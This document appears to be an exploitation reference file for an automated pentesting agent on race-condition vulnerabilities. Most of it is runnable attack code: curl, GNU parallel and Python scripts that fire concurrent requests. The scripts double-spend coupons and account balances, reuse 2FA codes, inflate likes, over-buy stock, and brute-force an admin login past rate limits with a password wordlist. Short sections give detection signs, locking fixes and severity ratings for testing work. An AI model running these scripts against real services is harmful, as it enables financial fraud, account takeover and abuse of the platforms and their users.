---
vuln_type: race_condition
severity: high
cwe: [CWE-362, CWE-367]
owasp: A04:2021-Insecure-Design
related_tools: [curl, interactsh]
exploit_agent: exploit_agent
tags: [race-condition, toctou, concurrency, limit-overrun, double-spend, parallel-requests]
---

# Race Conditions

## Overview
Occur when an application's behavior depends on the timing of concurrent operations. Attackers send multiple requests simultaneously to exploit the gap between a check and the action it guards (TOCTOU — Time Of Check, Time Of Use). Increasingly important in modern web apps with async processing.

---

## Common Vulnerable Scenarios

| Scenario | Impact | Example |
|----------|--------|---------|
| Coupon/promo code redemption | Multi-use a single-use code | Apply discount 10x simultaneously |
| Money transfer | Double-spend | Transfer $100 twice from $100 balance |
| Vote/like system | Inflate counts | Send 100 like requests at once |
| File upload + rename | Overwrite/race | Upload before validation completes |
| Account creation | Duplicate accounts | Register same email simultaneously |
| Invitation acceptance | Multiple uses | Accept invite multiple times |
| Rate limit bypass | Exceed limits | Requests arrive before counter updates |
| 2FA verification | Code reuse | Use same OTP in parallel requests |
| Inventory/stock | Over-purchase | Buy last item multiple times |

---

## Exploitation Techniques

### Single-Packet Attack (HTTP/2)
The most effective race condition technique. Send multiple requests in a single TCP packet so they arrive at the server simultaneously:

```bash
# Using turbo-intruder (Burp Suite extension) or custom scripts
# Key: requests must arrive at the same microsecond

# With curl + HTTP/2 multiplexing
# Send 20 parallel requests
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    --http2 \
    -X POST http://target.com/api/redeem-coupon \
    -b "session=COOKIE" \
    -d "code=SINGLE_USE_CODE" &
done
wait
```

### Last-Byte Synchronization (HTTP/1.1)
For HTTP/1.1, synchronize by:
1. Send all requests except the last byte
2. Send all last bytes simultaneously

```python
import requests
import threading

url = "http://target.com/api/transfer"
cookies = {"session": "YOUR_COOKIE"}
data = {"amount": "100", "to": "attacker"}

def send_request():
    r = requests.post(url, cookies=cookies, data=data)
    print(r.status_code, r.text[:100])

# Launch 20 threads simultaneously
threads = [threading.Thread(target=send_request) for _ in range(20)]
for t in threads:
    t.start()
for t in threads:
    t.join()
```

### Using GNU Parallel
```bash
# Create request file
echo 'curl -s -X POST http://target.com/api/redeem -b "session=COOKIE" -d "code=CODE" -o /dev/null -w "%{http_code}\n"' > req.sh
chmod +x req.sh

# Send 50 simultaneous requests
seq 50 | parallel -j50 bash req.sh
```

---

## Specific Attack Patterns

### 1. Coupon/Promo Code Double-Spend
```bash
# Single-use coupon "DISCOUNT50"
# Send 20 concurrent redemption requests
for i in $(seq 1 20); do
  curl -s -X POST http://target.com/api/apply-coupon \
    -b "session=COOKIE" \
    -d "coupon=DISCOUNT50" &
done
wait
# If discount applied multiple times → vulnerable
```

### 2. Balance Transfer Double-Spend
```bash
# Account has $100, transfer $100 twice simultaneously
for i in $(seq 1 5); do
  curl -s -X POST http://target.com/api/transfer \
    -b "session=COOKIE" \
    -d "amount=100&to=attacker_account" &
done
wait
# If total transferred > $100 → vulnerable
```

### 3. Rate Limit Bypass
```bash
# Rate limit: 5 login attempts per minute
# Send all 100 attempts in one burst
for password in $(head -100 /usr/share/wordlists/rockyou.txt); do
  curl -s -X POST http://target.com/login \
    -d "username=admin&password=$password" &
done
wait
# If more than 5 succeed before blocking → rate limit race
```

### 4. Follow/Like Inflation
```bash
# Like a post multiple times
for i in $(seq 1 50); do
  curl -s -X POST http://target.com/api/like \
    -b "session=COOKIE" \
    -d "post_id=12345" &
done
wait
# Check if like count increased by more than 1
```

### 5. Inventory Over-Purchase
```bash
# 1 item left in stock, buy it 10 times
for i in $(seq 1 10); do
  curl -s -X POST http://target.com/api/purchase \
    -b "session=COOKIE" \
    -d "item_id=123&quantity=1" &
done
wait
# If multiple purchases succeed → vulnerable
```

### 6. 2FA Code Reuse Race
```bash
# Get OTP code, use it in multiple parallel requests
OTP="123456"
for i in $(seq 1 10); do
  curl -s -X POST http://target.com/verify-2fa \
    -b "session=COOKIE" \
    -d "code=$OTP" &
done
wait
# If multiple sessions created → code not properly invalidated
```

---

## Time-of-Check to Time-of-Use (TOCTOU)

### Pattern
```
1. CHECK: Application verifies condition (balance >= $100)
   ← window of vulnerability ← 
2. USE: Application performs action (deduct $100)
```

### File-Based TOCTOU
```bash
# Application flow:
# 1. Check if uploaded file is safe (virus scan)
# 2. Move file to web directory
# Race: replace file between check and move

# Upload benign file
curl -X POST http://target.com/upload -F "file=@safe.jpg"
# Immediately try to replace with malicious file
# Or: upload malicious file that takes long to scan, access it before scan completes
```

---

## Detection Tips

### Signs a feature might be race-vulnerable
1. Any operation with a **check then act** pattern
2. Database operations without **SELECT FOR UPDATE** or transactions
3. Single-use tokens/codes without atomic redemption
4. Counter operations (likes, votes, balance) without locks
5. State machines that can be concurrent (order status changes)

### How to verify
1. Send request normally — note the response
2. Send 10-50 identical requests simultaneously
3. Compare: did the action happen more times than it should?
4. Check side effects (balance, count, stock) for inconsistency

---

## Automated Testing

### Python Script (Concurrent Requests)
```python
import asyncio
import aiohttp

async def send_request(session, url, data, cookies):
    async with session.post(url, data=data, cookies=cookies) as resp:
        return resp.status, await resp.text()

async def race(url, data, cookies, count=20):
    async with aiohttp.ClientSession() as session:
        tasks = [send_request(session, url, data, cookies) for _ in range(count)]
        results = await asyncio.gather(*tasks)
        for status, body in results:
            print(f"{status}: {body[:80]}")

asyncio.run(race(
    "http://target.com/api/redeem",
    {"code": "SINGLE_USE"},
    {"session": "YOUR_COOKIE"},
    count=20
))
```

### Bash One-Liner
```bash
# Quick race test — 20 parallel requests
seq 20 | xargs -P20 -I{} curl -s -X POST http://target.com/api/action -b "session=COOKIE" -d "param=value" -o /dev/null -w "Request {}: %{http_code}\n"
```

---

## Output Interpretation

### Confirmed race condition indicators
- Action succeeded more times than allowed (2+ redemptions of single-use code)
- Balance went negative or below what's possible
- Counter increased by more than expected
- Multiple success responses for an operation that should succeed once
- Duplicate records created in database

### Not a race condition (false positives)
- All but one request returned error (proper locking)
- Idempotent operation by design (resubmitting is safe)
- Application uses database transactions correctly

### Severity assessment
- **Critical**: Financial impact (double-spend, balance manipulation)
- **High**: Bypass security controls (rate limit, 2FA, single-use tokens)
- **Medium**: Data integrity issues (duplicate records, inflated counts)
- **Low**: No business impact (cosmetic counters, non-sensitive operations)
